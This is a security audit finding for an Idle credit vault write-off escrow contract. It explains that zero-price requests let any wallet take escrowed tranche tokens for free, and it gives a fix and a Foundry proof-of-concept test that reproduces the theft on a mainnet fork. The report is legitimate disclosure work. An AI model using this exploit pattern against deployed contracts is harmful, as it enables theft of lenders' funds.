### Title
Zero-price write-off requests let any fulfiller steal escrowed tranche tokens - (`contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` rejects zero tranche tokens but accepts `underlyingsRequested == 0`, allowing a requester to escrow valuable tranche tokens while recording a zero purchase price. [1](#0-0)   
Any unprivileged wallet can then call `fullfillWriteOffRequest` with `_underlyings == 0`; because zero satisfies `_underlyings >= currentRequest.underlyings`, the escrow deletes the request and transfers all escrowed tranche tokens to the attacker without transferring payment to the requester. [2](#0-1) 

### Finding Description
The write-off escrow is intended to exchange a lender’s tranche tokens for the requested amount of underlying tokens. [3](#0-2)   
During a running epoch, `createWriteOffRequest` validates `amount != 0`, transfers that amount of tranche tokens into escrow, and stores the caller’s requested underlying amount without checking that it is nonzero. [1](#0-0)   
`fullfillWriteOffRequest` is explicitly callable by any wallet and requires only an exact tranche amount plus an underlying payment that is at least the stored request amount. [4](#0-3)   
When the stored request amount is zero, `_underlyings == 0` passes this comparison; the subsequent `safeTransferFrom(..., 0)`, zero fee calculation, and zero payment to the lender preserve the attacker’s funds while `IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches)` pays out the escrowed tranche tokens. [5](#0-4) 

### Impact Explanation
A lender that mistakenly submits a nonzero tranche amount with `underlyingsRequested == 0` permanently loses the full escrowed tranche position and receives no underlying payment. [6](#0-5)   
The attacker’s profit equals the full value or redemption claim represented by the stolen tranche tokens; for example, `10_000e18` escrowed tranche tokens can be acquired for `0` underlying. [7](#0-6)   
This breaks fair exchange and one-receipt-one-payout semantics because the escrow releases the sole tranche-token side without requiring any corresponding underlying side. [2](#0-1) 

### Likelihood Explanation
Likelihood is low because the issue requires a lender to create a nonzero request while accidentally leaving the requested underlying amount at zero. [1](#0-0)   
Once such a request exists, exploitation is permissionless and immediate because fulfillment is not restricted to the borrower, an approved counterparty, or a KYC-passing account. [8](#0-7)   
Existing checks do not prevent the attack: the epoch-running check is satisfied during normal operation, the tranche amount is nonzero, and fulfillment considers zero sufficient payment for a zero-denominated request. [9](#0-8) 

### Recommendation
Revert in `createWriteOffRequest` when `underlyingsRequested == 0`, alongside the existing `amount == 0` check. [1](#0-0)   
For defense in depth, `fullfillWriteOffRequest` can also revert when `currentRequest.underlyings == 0`, preventing legacy zero-price requests from being fulfilled for free while still allowing the lender to recover tokens through `deleteWriteOffRequest`. [10](#0-9)   

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

### Proof of Concept
The following test extends the existing mainnet-fork fixture in `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which pins mainnet block `23032567`, initializes the escrow against `cdoEpoch`, and approves the escrow to spend LP’s AA tranche tokens. [11](#0-10) 

```solidity
function testZeroPriceWriteOffRequestCanBeFilledForFree() external {
    address attacker = makeAddr("attacker");
    uint256 tranches = 10_000e18;

    assertTrue(cdoEpoch.isEpochRunning(), "epoch must be running");
    assertEq(underlying.balanceOf(attacker), 0, "attacker starts with no underlying");
    assertEq(tranche.balanceOf(attacker), 0, "attacker starts with no tranche");

    // Victim escrows tranche tokens but accidentally requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(tranches, 0);

    assertEq(tranche.balanceOf(address(escrow)), tranches);
    assertEq(escrow.pendingUnderlyings(), 0);

    // Permissionless attacker satisfies the zero-price request with no payment.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, tranches, 0);

    assertEq(tranche.balanceOf(attacker), tranches, "attacker stole all tranches");
    assertEq(tranche.balanceOf(address(escrow)), 0);
    assertEq(underlying.balanceOf(attacker), 0, "attacker paid nothing");
    assertEq(underlying.balanceOf(LP), 0, "victim received nothing for this request");

    (uint256 remainingTranches, uint256 remainingUnderlyings) =
        escrow.userRequests(LP);
    assertEq(remainingTranches, 0);
    assertEq(remainingUnderlyings, 0);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L84-151)
```text
  /// @notice create a write-off request by depositing tranche tokens and setting the amount of underlyings requested
  /// @param amount of tranche tokens to deposit
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-62)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
```
